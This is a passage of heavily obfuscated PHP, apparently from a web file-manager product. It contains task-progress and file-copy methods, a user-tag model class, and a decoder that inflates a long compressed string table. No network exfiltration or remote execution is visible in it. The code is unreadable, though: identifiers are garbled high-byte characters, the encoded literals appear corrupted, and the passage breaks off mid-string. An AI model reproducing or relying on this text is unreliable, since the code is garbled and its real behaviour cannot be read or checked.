$éÒÆØÊ[$îÔ¨õ¦±[1810]] * 0.5 + $éÒÆØÊ[$îÔ¨õ¦±[1811]] * 0.5; } } } } $éÒÆØÊ[$îÔ¨õ¦±[1759]] = $éÒÆØÊ[$îÔ¨õ¦±[1815]] / $éÒÆØÊ[$îÔ¨õ¦±[816]]; if ($éÒÆØÊ[$îÔ¨õ¦±[1759]] > 0) { $ùà»ş‘Ä = timeFloat() - $éÒÆØÊ[$îÔ¨õ¦±[1761]] - $éÒÆØÊ[$îÔ¨õ¦±[1764]]; $éÒÆØÊ[$îÔ¨õ¦±[1765]] = $ùà»ş‘Ä * (1 - $éÒÆØÊ[$îÔ¨õ¦±[1759]]) / $éÒÆØÊ[$îÔ¨õ¦±[1759]]; } } public function addPath($åŞŒÏš ) { $ô¡Ò½ïÊ =& $_SERVER[Ñ¯©ç]; if (!$åŞŒÏš ) { return; } $¢—˜œËî =& $this->task; $×ÓÙÕÒÜ = IO::infoWithChildren($åŞŒÏš ); $™‹·›ú• = $¢—˜œËî[$ô¡Ò½ïÊ[1819]] ? $¢—˜œËî[$ô¡Ò½ïÊ[1819]][$ô¡Ò½ïÊ[1820]] : 0; $¢—˜œËî[$ô¡Ò½ïÊ[1819]] = array($ô¡Ò½ïÊ[1820] => $™‹·›ú• + 1, $ô¡Ò½ïÊ[477] => $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[32]], $ô¡Ò½ïÊ[97] => $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[97]], $ô¡Ò½ïÊ[566] => $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[566]] ? $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[566]] : $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[97]]); if ($×ÓÙÕÒÜ[$ô¡Ò½ïÊ[33]] == $ô¡Ò½ïÊ[231]) { $¢—˜œËî[$ô¡Ò½ïÊ[1116]] += 1; } else { $¢—˜œËî[$ô¡Ò½ïÊ[1116]] += $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[92]][$ô¡Ò½ïÊ[90]]; if ($×ÓÙÕÒÜ[$ô¡Ò½ïÊ[194]]) { $¢—˜œËî[$ô¡Ò½ïÊ[1116]] += $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[92]][$ô¡Ò½ïÊ[91]] + 1; } } $¢—˜œËî[$ô¡Ò½ïÊ[816]] += $×ÓÙÕÒÜ[$ô¡Ò½ïÊ[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($îø¥Ãİã) { } public function sourceAddHashEnd($Š‡û®Õ) { } public function sourceAddFileStart($Û¡ÓŠ™™) { $÷²µê†† =& $_SERVER[Ñ¯©ç]; $Î–½µòã =& $this->task; $Î–½µòã[$÷²µê††[1810]] = $Û¡ÓŠ™™[$÷²µê††[89]]; $Î–½µòã[$÷²µê††[1808]] = $Û¡ÓŠ™™[$÷²µê††[32]]; $Î–½µòã[$÷²µê††[1118]] = $Û¡ÓŠ™™[$÷²µê††[32]]; $Î–½µòã[$÷²µê††[1821]] = $Û¡ÓŠ™™[$÷²µê††[97]]; $this->update(); } public function sourceAddFileEnd($‘à³ƒ) { $­ÛæíÁ½ =& $_SERVER[Ñ¯©ç]; $ïÂ¤¬ƒ =& $this->task; $ïÂ¤¬ƒ[$­ÛæíÁ½[1815]] += $‘à³ƒ[$­ÛæíÁ½[89]]; $ïÂ¤¬ƒ[$­ÛæíÁ½[1821]] = $‘à³ƒ[$­ÛæíÁ½[97]]; $this->update(1); } public function copyFileStart($ŒÒÁäÌû, $ë§Âñ–ú, $•†ö÷›Ş, $ıÆ‡¾ó¯, $ÒÔğ­Ë, $×—İ¯ıİ) { $¦Íº±Ú =& $_SERVER[Ñ¯©ç]; $Ø¼‚ƒğ = $ÒÔğ­Ë; if ($Ø¼‚ƒğ == $GLOBALS[$¦Íº±Ú[1822]]) { $Ø¼‚ƒğ = $GLOBALS[$¦Íº±Ú[1823]]; } $GLOBALS[$¦Íº±Ú[1823]] = $ÒÔğ­Ë; $GLOBALS[$¦Íº±Ú[1822]] = $×—İ¯ıİ; $Â÷×ü¹… =& $this->task; $Â÷×ü¹…[$¦Íº±Ú[1808]] = $Ø¼‚ƒğ; $Â÷×ü¹…[$¦Íº±Ú[1810]] = (int) $ŒÒÁäÌû->size($ë§Âñ–ú); $Â÷×ü¹…[$¦Íº±Ú[1811]] = 0; $Â÷×ü¹…[$¦Íº±Ú[1118]] = $¦Íº±Ú[12]; $Â÷×ü¹…[$¦Íº±Ú[1812]] = $¦Íº±Ú[12]; $Â÷×ü¹…[$¦Íº±Ú[1813]] = 0; $É¹®İ–÷ = $Â÷×ü¹…[$¦Íº±Ú[1810]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Â÷×ü¹…[$¦Íº±Ú[458]] . $¦Íº±Ú[1824]); if ($É¹®İ–÷ && file_exists(get_path_father($ıÆ‡¾ó¯))) { Cache::set($Â÷×ü¹…[$¦Íº±Ú[458]] . $¦Íº±Ú[1824], $ıÆ‡¾ó¯); $Â÷×ü¹…[$¦Íº±Ú[1781]] = array($¦Íº±Ú[1825], $¦Íº±Ú[1826]); } $this->update(0, $É¹®İ–÷); } public static function updateCopyLocalFileSize($Ïß½Éà) { $œáŠàÈå =& $_SERVER[Ñ¯©ç]; $ÃÇ“…ô = Cache::get($Ïß½Éà[$œáŠàÈå[458]] . $œáŠàÈå[1824]); if (!$ÃÇ“…ô || !file_exists($ÃÇ“…ô)) { return $Ïß½Éà; } $Ïß½Éà[$œáŠàÈå[1811]] = @filesize($ÃÇ“…ô); $Ïß½Éà[$œáŠàÈå[1815]] += $Ïß½Éà[$œáŠàÈå[1811]]; self::updateTask($Ïß½Éà); return $Ïß½Éà; } public function copyFileEnd($–ıì…’, $Â«æÇ¸÷, $‡¬ğ³, $©ÔÒÔç, $¯³™ñ…, $íÔŒúøÌ) { $ÅÊ­³‰´ =& $_SERVER[Ñ¯©ç]; $ÈÚ¸Ó† =& $this->task; $ÈÚ¸Ó†[$ÅÊ­³‰´[1811]] = $ÈÚ¸Ó†[$ÅÊ­³‰´[1810]]; $ÈÚ¸Ó†[$ÅÊ­³‰´[1812]] = $ÅÊ­³‰´[12]; unset($ÈÚ¸Ó†[$ÅÊ­³‰´[1781]]); if ($¯³™ñ… == $ÈÚ¸Ó†[$ÅÊ­³‰´[1808]]) { $ÈÚ¸Ó†[$ÅÊ­³‰´[1814]] += $ÈÚ¸Ó†[$ÅÊ­³‰´[1810]]; $ÈÚ¸Ó†[$ÅÊ­³‰´[1815]] = $ÈÚ¸Ó†[$ÅÊ­³‰´[1814]]; $Ö¢µ°÷Œ = 1; if (isset($ÈÚ¸Ó†[$ÅÊ­³‰´[1821]]) && $ÈÚ¸Ó†[$ÅÊ­³‰´[1821]] == $Â«æÇ¸÷) { $Ö¢µ°÷Œ = 0; } $this->update($Ö¢µ°÷Œ); } else { $this->update(); $ÈÚ¸Ó†[$ÅÊ­³‰´[1811]] = 0; } Cache::remove($ÈÚ¸Ó†[$ÅÊ­³‰´[458]] . $ÅÊ­³‰´[1824]); self::log($ÅÊ­³‰´[1827] . $Â«æÇ¸÷ . $ÅÊ­³‰´[83] . $©ÔÒÔç . $ÅÊ­³‰´[59] . $¯³™ñ… . $ÅÊ­³‰´[1828] . $ÈÚ¸Ó†[$ÅÊ­³‰´[1808]]); } public function updateFileEnd($Şñé—Íâ, $¨­äÒË¯) { $¥‹ …¹ =& $_SERVER[Ñ¯©ç]; $Êœğˆ“‰ =& $this->task; $Êœğˆ“‰[$¥‹ …¹[1808]] = $Şñé—Íâ; $Êœğˆ“‰[$¥‹ …¹[1810]] = $¨­äÒË¯; $Êœğˆ“‰[$¥‹ …¹[1814]] += $¨­äÒË¯; $Êœğˆ“‰[$¥‹ …¹[1815]] = $Êœğˆ“‰[$¥‹ …¹[1814]]; $this->update(1); self::log($¥‹ …¹[1829] . $Şñé—Íâ); } public function sourceModelCopy($¹ê¶ñµÀ) { $ûÈ…’”‰ =& $_SERVER[Ñ¯©ç]; $ş­½õŸ“ = $¹ê¶ñµÀ[0]; $ıÄ¥°· = $¹ê¶ñµÀ[1]; $‚­Ü·¶ =& $this->task; $this->sourceModelCopyFlag = !0; $‡­ìà‚ = 0; switch ($ş­½õŸ“) { case $ûÈ…’”‰[618]: $‡­ìà‚ = 1; break; case $ûÈ…’”‰[621]: $‚­Ü·¶[$ûÈ…’”‰[1808]] = $ıÄ¥°·[$ûÈ…’”‰[32]]; break; case $ûÈ…’”‰[623]: $‡­ìà‚ = intval($¹ê¶ñµÀ[$ûÈ…’”‰[439]] * 0.4); break; case $ûÈ…’”‰[625]: $‡­ìà‚ = intval($¹ê¶ñµÀ[$ûÈ…’”‰[439]] * 0.2); break; case $ûÈ…’”‰[627]: $‡­ìà‚ = intval($¹ê¶ñµÀ[$ûÈ…’”‰[439]] * 0.4); break; } $this->update($‡­ìà‚); $this->sourceModelCopyFlag = !1; } public function sourceRemove($œ°±–µ, $ÎË—Ş»ä) { $ÎÄú¾´ =& $_SERVER[Ñ¯©ç]; $this->sourceModelCopyFlag = !0; $×İêïç = 1; if (isset($œ°±–µ[$ÎÄú¾´[92]])) { $×İêïç = $œ°±–µ[$ÎÄú¾´[92]][$ÎÄú¾´[90]]; $×İêïç = $×İêïç + $œ°±–µ[$ÎÄú¾´[92]][$ÎÄú¾´[91]] + 1; } $this->update($×İêïç); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÊßíŒ•æ) { $this->sourceRemove($ÊßíŒ•æ, !1); } public function curlProgress($Òºô…Òµ, $„’½ù›ê, $òÙ»üµ¸, $¦å÷µë, $¥¬¿™î) { $Íó£ìğ¿ =& $_SERVER[Ñ¯©ç]; $ş°ÂÀ™¯ =& $this->task; if ($¥¬¿™î > 0) { $ş°ÂÀ™¯[$Íó£ìğ¿[1118]] = $Íó£ìğ¿[1830]; $ş°ÂÀ™¯[$Íó£ìğ¿[1812]] = $Íó£ìğ¿[120]; if ($ş°ÂÀ™¯[$Íó£ìğ¿[1810]]) { $ş°ÂÀ™¯[$Íó£ìğ¿[1811]] = $¥¬¿™î; } if ($ş°ÂÀ™¯[$Íó£ìğ¿[1813]]) { $ş°ÂÀ™¯[$Íó£ìğ¿[1811]] = $¥¬¿™î + $ş°ÂÀ™¯[$Íó£ìğ¿[1813]]; } } else { if ($òÙ»üµ¸ > 0) { if ($ş°ÂÀ™¯[$Íó£ìğ¿[1810]] == $„’½ù›ê) { $ş°ÂÀ™¯[$Íó£ìğ¿[1811]] = $òÙ»üµ¸; $ş°ÂÀ™¯[$Íó£ìğ¿[1118]] = $Íó£ìğ¿[1831]; $ş°ÂÀ™¯[$Íó£ìğ¿[1812]] = $Íó£ìğ¿[1251]; } } } $this->update(); } public function curlProgressStart($È©¡ô²š) { } public function curlProgressEnd($©€§…Ã) { $×ûıá·– =& $_SERVER[Ñ¯©ç]; $ÛŠÈãó¹ =& $this->task; $¸ä¬µˆ‹ = curl_getinfo($©€§…Ã); $ì–ñÓ½¿ = $¸ä¬µˆ‹[$×ûıá·–[1832]]; if ($ì–ñÓ½¿ == -1) { $ì–ñÓ½¿ = $¸ä¬µˆ‹[$×ûıá·–[1833]]; } if ($ÛŠÈãó¹[$×ûıá·–[1812]] == $×ûıá·–[120] && $ì–ñÓ½¿) { $ÛŠÈãó¹[$×ûıá·–[1813]] += $ì–ñÓ½¿; } $this->update(); } } goto dø‡ë«›½ä; BìÔïøƒ”Ô: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\x2e\x74\x61\147\114\151\x73\164"; public $modelType = "\x55\163\x65\x72\x4f\160\x74\151\157\x6e"; public $field = array("\156\x61\155\145", "\163\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($•ŠÑÂœ = false, $¸Ñœ™ü = "\163\x6f\162\164", $î¨•¦åº = false) { return parent::listData($•ŠÑÂœ, $¸Ñœ™ü, $î¨•¦åº); } public function remove($ÂêŠ˜) { return parent::remove($ÂêŠ˜); } public function add($ßÄ²’ğ÷, $ùÁ±ŒÈ  = "\x6c\x61\142\145\154\x2d\x67\162\x65\171\55\156\157\162\155\141\x6c") { $æ‰Òû­ =& $_SERVER[Ñ¯©ç]; if ($this->findByName($ßÄ²’ğ÷)) { return !1; } $µĞÀµ “ = array($æ‰Òû­[477] => $ßÄ²’ğ÷, $æ‰Òû­[542] => $ùÁ±ŒÈ , $æ‰Òû­[1959] => $this->getSort($æ‰Òû­[319]) + 1); return parent::insert($µĞÀµ “); } public function update($¬Ğ”Ğ, $¾± Å) { $ÔŒ°ˆÓî =& $_SERVER[Ñ¯©ç]; $—ä±Üó‘ = $this->listData($¬Ğ”Ğ); $µŒáº  = $this->findByName($¾± Å[$ÔŒ°ˆÓî[32]]); if (!$—ä±Üó‘ || $µŒáº  && $µŒáº [$ÔŒ°ˆÓî[458]] != $—ä±Üó‘[$ÔŒ°ˆÓî[458]]) { return !1; } return parent::update($¬Ğ”Ğ, $¾± Å); } public function moveTop($‚»ÁÆõô) { $ïäè©î× =& $_SERVER[Ñ¯©ç]; $ëØòıÅœ = parent::listData(); $åˆ¹ŠÖ• = $this->getSort($ïäè©î×[318]); foreach ($ëØòıÅœ as &$áò´µ”‹) { if ($áò´µ”‹[$ïäè©î×[458]] == $‚»ÁÆõô) { $áò´µ”‹[$ïäè©î×[1979]] = $åˆ¹ŠÖ•; continue; } $áò´µ”‹[$ïäè©î×[1979]] += 1; } unset($áò´µ”‹); return parent::resetData($ëØòıÅœ); } public function moveBottom($œ«çÛ) { $³ÍåË‰ =& $_SERVER[Ñ¯©ç]; $Öº§ªí = $this->getSort($³ÍåË‰[319]) + 1; return parent::update($œ«çÛ, array($³ÍåË‰[1979] => $Öº§ªí)); } public function resetSort($â´—‚ı¹) { $ĞÜ˜¡”× =& $_SERVER[Ñ¯©ç]; $å‡é¿‹¬ = array(); $â´—‚ı¹ = is_array($â´—‚ı¹) ? $â´—‚ı¹ : array(); for ($å¹¿ò¹ó = 0; $å¹¿ò¹ó < count($â´—‚ı¹); $å¹¿ò¹ó++) { $å‡é¿‹¬[$â´—‚ı¹[$å¹¿ò¹ó] . $ĞÜ˜¡”×[12]] = $å¹¿ò¹ó + 1; } $½øƒÁ£æ = parent::listData(); foreach ($½øƒÁ£æ as &$Íå š‡) { $ô·šÃ = $å‡é¿‹¬[$Íå š‡[$ĞÜ˜¡”×[458]]]; $Íå š‡[$ĞÜ˜¡”×[1979]] = $ô·šÃ ? $ô·šÃ : $Íå š‡[$ĞÜ˜¡”×[1979]]; } unset($Íå š‡); return parent::resetData($½øƒÁ£æ); } private function getSort($³ªÎ¹Á) { $ï’ğˆ£é =& $_SERVER[Ñ¯©ç]; $Œ±âª®¾ = parent::listData(); $‡„’ÄÈ„ = array_to_keyvalue($Œ±âª®¾, $ï’ğˆ£é[12], $ï’ğˆ£é[1979]); if (!$‡„’ÄÈ„) { $‡„’ÄÈ„ = array(0); } $áì¥×½… = $³ªÎ¹Á == $ï’ğˆ£é[319] ? max($‡„’ÄÈ„) : min($‡„’ÄÈ„); return intval($áì¥×½…); } } goto EÁÓÉï”ÍÜ; B¸êË”¡ææ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\321\257\235\251\220\347", base64_decode('u+HilPqG')); $_SERVER[Ñ¯©ç] = explode("\174\2\174\2\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\133\305\265\60\55\74\112\50\357\101\151\372\240\257\13\27\103\142\73\321\142\73\273\23\307\221\145\331\26\221\55\43\311\131\260\315\315\225"."\x74\x6d\xdf\x58\xd2\x95\x75\xaf\xbc\xc5\x69\x59\x12\x20\x40\x8\x69\xd9\x49\x58\xb\x85\xb6\x9\x84\x2\x81\x84\xad\x94\xf5\x95\x16\x28\x65\xed\xa3\xa5\x10\x27\xa1\x40\xa1\xf4\xe7\x15\xa\x85\x7f\x96\x33\xcb"."\xbd\x92\xe1\xfd\xdf\xff\x7f\xdf\x1f\x48\x34\xcb\x99\xb9\x33\x67\xce\x9c\x39\x73\xe6\xcc\x99\x5b\x3f\xdd\xb1\xf3\xfd\x9f\x4e\x7c\x19\xfd\xf7\x2f\xe7\xdc\x79\xe5\x63\x77\x5d\x48\xc3\x13\x87\xa2\xff\xbe\x44\xc3"."\47\134\160\304\41\344\317\327\57\70\277\252\252\155\376\221\263\73\216\332\162\347\16\355\360\246\307\76\174\344\316\247\266\375\356\265\247\176\222\110\57\335\263\255\377\273\207\354\155\266\226\325".base64_decode('I1Basp7+KDnTVvRRw7ItmpAyc31GPw0bOfrrpz9dsUhBz5q2TqM++qNCq8i/1lDGYPlqRw==')."\64\241\306\273\72\73\103\261\4\0\325\313\371\131\63\15\241\274\126\320\262\360\375\274\136\260\120\153\344\352\324\274\231\327\163\216\24\221\220\326\154\55\251\131\120\123\163\223\332\34\352\214".base64_decode('RFeridWdIYBIqkNFvTBGYyQYt7WCnTCyOocYKfB2NYVawx1KIhboiAeCiXC0gyYHo+3t4Q==')."\104\151\172\54\32\211\64\5\202\313\113\163\72\143\201\326\366\200\202\332\227\321\125\43\327\147\126\51\153\150\316\32\245\232\6\132\14\75\223\246\301\234\306\232\143\217\345\41\224\340\41\64"."\x4c\xb9\x62\x26\x43\x23\x1d\x3c\x94\xd6\xfb\xb4\x62\x6\xb0\xd5\x2c\x47\xf2\x5\x23\xab\xb1\x4e\x2f\xd7\xc7\x78\x2a\xd\x68\x45\xdb\x34\x72\x29\x1a\x9\x8d\xda\x5\x4d\xa4\xa3\xb6\xa6\xd0\x40\xeb\x39\xa8\x2a"."\x1e\x8a\x84\x82\x9\x5\x37\x50\x69\x89\x45\xdb\x15\x18\x84\xac\x66\xd9\x7a\x41\x59\xd9\x16\x8a\x85\x14\xdc\xe8\x86\x4a\xd2\xd7\x4a\x5\xe8\xa5\x3\xa1\x42\x9\x44\x22\xca\x54\x35\xd8\x7a\x36\xcf\xaa\xa1\x65"."\312\124\26\215\65\207\142\112\323\152\105\140\50\145\146\263\146\316\207\152\101\43\151\113\115\15\305\142\64\340\1\362\216\204\361\240\101\44\332\322\22\17\361\30\120\251\326\147\144\364\270\61"."\256\207\163\162\12\15\343\220\332\257\333\52\232\26\66\372\12\20\151\123\40\36\16\252\235\201\104\33\140\55\237\367\133\351\101\313\257\25\122\3\306\260\36\61\222\376\244\221\363\143\342\364"."\x25\xd9\x34\x3a\x92\xfe\xcc\x85\x3e\xc\xe8\xa9\x41\x55\x4b\x9a\x5\x5b\x7\x12\x28\xe6\x32\x46\x6e\x50\x9e\x4f\xf1\x53\x23\x8\x4f\x73\x60\xf6\x38\x62\xe9\xbe\x8c\xad\xe\x6b\x99\x22\x9b\x44\x50\xb0\x12\x7e"."\xe0\xd7\xb4\xa0\xcd\x43\x46\xce\x28\xc2\x24\x82\x2a\x4c\x93\x4f\x7a\x8\x14\x19\xb4\xce\x52\xf4\x34\x4\xb2\xa8\xbc\x9\xe5\x92\x90\x96\x64\x50\x6b\x59\xc0\x40\x88\x1a\xa6\xc1\x86\xa5\xf4\x77\x31\x94\x4f\x62"."\x24\xe\xeb\x5\x5b\xd5\x73\x29\x33\x6d\xe4\x80\xcb\x34\xc2\x6c\xd1\xec\x81\xe6\x2\x42\x5e\x1\x50\x6f\x66\xd2\x2c\x6c\xa1\xe1\x11\x3\xd2\x51\xcc\xca\x20\x3c\x8a\x50\x9f\x49\x17\x18\x63\xf8\x3c\x48\x1a\x8d"."\x70\x3e\x83\x61\x45\x2c\x8f\x5a\x32\xc1\x58\x94\xd1\x37\x26\x18\x5\x86\xeb\xe4\xb9\x96\x59\x2c\xa4\x10\xd9\xf4\x1\x5a\x6a\x21\x59\xb7\x6d\xd4\x39\x86\x10\xb3\x2b\x9f\x31\xb5\x74\x5c\x2f\xf0\xae\x19\x66\xb".base64_decode('qihatOXEIgFrMQvZZkQ18H00nY2uMhmDbEKnJYz5q7rP9H7a270M/VMNPLsH2jSgZzKqPg==').base64_decode('qsOMz6bnWQwZfguTKkqh0XBUHdCsgfb0PJWUgibn0vqoLz+Qp1HBi3oYBZEZiVHXYdohaQ==')."\101\311\230\51\55\43\167\221\206\7\154\73\37\327\163\351\26\76\327\322\346\110\216\140\52\257\263\11\321\354\121\322\112\273\262\132\151\253\67\352\55\126\60\233\341\41\326\73\236\146\361\104"."\x7b\x94\xd\x67\xba\xf\xa8\x95\x4d\xc4\xa\xf8\xa0\x61\x11\xd6\x2c\xf8\xa\x9a\xc7\x19\x23\xa5\xd9\x86\x99\xf3\x9b\x29\x5b\xb7\xbd\x96\x5d\xd0\x35\xa8\x31\x90\x4a\xe9\x96\xe5\xd\x22\x56\x50\x30\x33\xde\x40"."\46\143\216\170\243\5\243\337\310\325\53\263\50\114\220\362\11\57\346\334\365\300\142\52\26\53\230\160\360\147\146\65\24\355\76\357\102\66\71\71\164\101\313\131\175\172\301\33\202\231\121\257"."\240\306\162\366\315\300\232\15\53\157\132\6\156\136\275\242\331\266\226\32\300\254\117\124\337\360\71\360\6\146\56\172\11\154\150\64\157\24\164\213\265\125\151\155\117\100\45\250\166\335\333\131"."\xd0\xfa\xb3\x5a\xbd\x92\x2f\x26\x11\x66\x60\xa6\x96\x49\xa3\xd0\x80\x9a\x7a\x25\x85\xa3\x1e\x25\x5b\xb4\x6c\x6f\x41\x47\x5c\xca\x40\xac\x10\x90\x1c\xee\xf3\xb6\xe3\x79\x65\xe8\x69\x6f\x1c\x2d\x35\x90\x3c\xa7".strrev('DsNÄŠ¾ uq0¿4^UÄ²Uáh#›YúÖÈn8Dí©è–H-ÃTè‘-µ4yaGH‚®f')."\57\240\17\67\215\325\53\203\146\72\151\216\372\130\126\13\254\3\14\30\17\167\336\366\306\264\134\77\306\117\162\314\326\201\4\5\253\152\102\222\207\257\217\116\146\137\122\357\63\13\320\33"."\x6b\xb8\xdf\x39\x16\x11\x3d\xd7\x6f\xf\xb0\xba\xe3\xa1\xd8\x8a\x50\x4c\x8d\x47\x5b\x12\x2b\x3\x31\x10\x54\x72\x88\x90\x46\x59\x6b\xf0\xd7\x33\xde\x98\x9e\x46\xa3\x93\xb2\x59\x39\x2d\x8f\x11\xcb\x60\xf0\xfc"."\301\37\147\271\170\116\261\274\110\270\25\343\256\331\153\41\40\257\14\305\352\216\30\131\3\167\317\346\71\4\331\110\212\151\205\6\371\111\237\33\172\254\131\125\75\351\331\325\136\364\357\254"."\352\356\236\146\337\254\336\106\277\41\312\370\153\175\265\112\135\315\174\245\23\211\125\206\226\121\240\323\45\20\65\112\164\271\23\55\202\340\163\146\116\377\34\344\340\225\117\342\14\56\264\322".base64_decode('xFjo1K5QPKG2hxJt0Wb4eigAoYhJZzbrbTf96QUC6KU/qmG1SCsPjnIOpZrJtWgw2nXGhg==')."\x61\xe4\xc3\x59\xad\x5f\x5a\x7\x54\xe7\x32\x81\x63\x38\xb3\x5d\x10\x7\xa2\xb2\x95\x46\x9a\xaf\x23\x28\xda\xa6\x1b\xfd\x3\x80\x30\x3\x57\x97\x32\x33\x66\x41\xcb\x60\xee\xc9\x26\x8e\xce\x38\x5a\xbf\x1\x1c"."\55\237\51\42\232\361\343\57\44\6\212\331\44\60\175\44\335\42\231\105\10\217\326\30\222\260\200\211\41\131\33\341\55\14\70\201\45\14\142\176\25\217\163\217\57\237\353\257\76\31\352\122"."\353\346\325\340\4\40\121\350\42\222\242\213\322\232\310\160\340\113\231\150\122\264\153\203\172\75\356\24\260\230\305\44\225\105\44\336\263\30\57\27\15\356\71\205\307\51\343\313\242\112\110\235"."\101\223\57\160\164\237\2\362\4\133\56\24\275\120\60\13\47\2\4\11\53\144\315\301\343\6\225\333\174\5\267\320\364\141\341\1\223\257\370\110\10\243\241\172\77\364\173\106\135\13\114\271"."\x34\x92\x7c\x7c\x96\x8d\x46\x3\x75\x50\x4b\xa7\xcb\x25\xa3\x69\xa\x15\x4c\xc0\x77\x68\xc6\x4\x2c\xa9\xfe\xf8\x1c\xf4\xbf\x58\x3f\xd3\x66\x56\x63\xab\x11\x59\x47\xf4\x34\x5d\x48\x1c\x49\x6d\xba\xc6\x9\x71"."\x16\xab\xb7\x60\x9b\x38\xb3\xe0\x80\x44\x24\x39\x60\x42\xcb\xd0\xd0\x43\xaf\x8a\xbc\x7b\xac\xa3\x69\x3d\xa3\x33\x72\x1a\xd0\xd9\x5a\x5c\x3\x60\x8\xfd\x9c\xd8\x84\xc\x8c\xf6\x2\x28\x55\x8\x41\x86\x15\x43"."\45\361\312\311\342\53\361\346\111\44\140\361\1\210\107\4\63\150\350\242\144\372\210\170\147\101\357\63\200\343\345\20\165\267\153\205\101\326\61\124\122\114\74\34\221\46\145\113\127\44\242\6"."\243\35\11\264\367\242\51\53\143\341\4\60\212\30\232\360\152\40\330\11\61\314\275\151\220\113\70\362\32\115\123\206\353\200\116\120\43\374\102\230\100\353\142\336\314\131\272\27\244\177\257\330".base64_decode('mZVkpcVaCwQi1mfXkjvq1bLj3iziIl7eJqeko8AaTAWmMAyTWEIx8tBEZiJWZzQOBRpxKg==')."\x12\x73\x93\x7c\xbe\x75\x76\x41\x56\x56\x22\x91\xd6\x10\x24\x5a\x3\x1a\x48\xad\x81\x95\x71\xb6\xee\x15\x11\x60\xc1\x18\xd7\x44\x5f\x1a\x59\x43\x58\xf\xb2\x19\x21\x2e\x3b\xbb\xe3\x15\x43\x5e\xb4\xbc\x3a\x5e"."\x9a\xc5\x17\xe6\x7a\xdb\xda\x3\x41\x6f\xbc\x2d\x50\x37\x6f\x3e\x4d\x5d\x9d\x4d\xf7\x24\xda\xc\xab\xe7\x34\x1e\x7\xfc\x8d\x58\x73\xd5\x82\x8e\x38\xd\xfb\x50\x5d\xd\xd4\xa4\x63\x99\x45\x6a\xde\x6a\x6f\xd6"."\213\153\301\250\363\325\324\324\260\272\146\317\127\6\20\203\3\62\66\163\151\62\74\154\357\122\114\15\262\231\242\245\230\370\210\25\3\226\167\304\140\274\371\144\56\151\237\134\112\66\47\73"."\127\41\250\242\110\304\104\125\113\341\217\251\250\106\273\150\311\230\102\363\51\215\12\31\114\52\246\251\132\246\37\41\335\36\310\312\211\142\304\151\134\247\302\32\37\73\216\105\214\133\47\161"."\xcb\x4d\xca\x9b\x48\x4e\x83\x6e\xac\x2a\xdb\x86\x55\xe5\xda\xb0\xca\xd5\x86\x55\xa5\x6d\xa0\x49\x96\xd1\x9f\x43\xbd\x64\xcb\x5b\xa2\x2d\xdc\xb1\x5c\x6d\x8f\x36\x87\x22\x6a\xb8\x3\xad\xe6\x89\xd2\xf4\xae\xce"."\xe6\x0\x9b\xb1\x72\x7a\x53\x94\xed\xa9\x21\xb5\xb\xad\xe7\x2b\x2\x91\xb0\x1b\x3c\xb4\x2a\x1c\x4f\xc4\xcb\x66\xa1\xb4\xae\x90\x2b\xa7\xb9\x49\xed\x8c\x85\x5a\xc2\xab\x78\xb4\x25\x1c\x8a\x34\xc7\xd5\x60\x20"."\xd8\x26\x60\x3a\x2\xed\x10\x41\x8b\xb8\x9e\x49\x5b\x7e\x27\xbc\x8a\x4\x93\x38\x57\xf0\xa8\xc3\x58\x59\x65\x72\xbd\x81\xac\x53\x51\xd9\x7e\x5c\x15\x4c\x3\xc9\xa8\x3a\x20\x1c\xba\x8b\x55\x64\xa4\x27\x2a\x23"."\xd2\x22\x13\x9b\xf8\xfe\x2c\xcb\x56\x85\xac\x6\xbc\x52\x63\xc2\x65\x15\xfd\xa9\x56\x2\x71\xc5\xce\x43\x1d\x88\xff\x27\xc7\x78\x90\x74\x83\xc5\xd1\xaa\x8\xdf\x57\x40\x48\x2a\x69\x81\x8a\x61\x9a\x24\x49\xb6"."\174\102\240\317\346\42\222\53\216\270\235\310\103\43\20\40\272\70\104\11\144\104\340\63\6\342\235\5\73\300\232\323\47\364\140\152\264\63\24\13\140\55\232\272\62\26\355\150\205\2\43\3"."\72\153\100\30\320\137\305\366\54\240\114\263\305\22\204\66\34\32\323\133\10\244\257\65\31\52\147\322\37\264\311\202\257\352\71\206\356\44\136\206\231\44\306\2\175\210\375\261\45\324\54\362"."\317\44\115\23\252\316\140\141\172\202\55\15\134\13\267\326\142\324\61\312\26\225\331\23\214\207\1\315\106\227\207\72\124\106\122\64\46\221\41\115\10\305\142\321\30\140\302\66\7\231\216\203"."\146\306\102\161\306\317\61\277\64\30\236\374\276\331\100\276\72\222\66\340\363\376\323\173\106\146\127\165\173\147\373\172\121\240\172\326\62\32\205\130\217\317\21\145\102\140\261\300\113\343\75\106"."\225\325\130\135\337\343\357\361\127\65\326\167\7\274\343\232\167\274\306\273\310\333\213\104\307\352\331\220\320\273\256\316\63\167\75\6\100\200\215\47\365\242\237\206\236\306\31\75\336\231\337\133"."\263\254\273\247\267\262\176\366\211\75\276\223\172\106\172\147\125\67\262\357\244\212\5\44\235\62\126\205\232\232\236\135\205\232\204\366\36\34\44\107\26\67\11\200\145\214\33\171\221\272\156\376"."\172\226\216\306\120\357\27\45\272\275\75\263\173\33\245\162\122\222\373\133\210\205\242\225\166\200\303\5\274\247\341\236\361\242\170\302\3\175\24\163\51\261\36\341\11\221\324\122\300\0\20\163".strrev('0qÄwJ‘íÔ„fÓ>œï$Ä1œÅ@äh³¿d'."\r".'»ú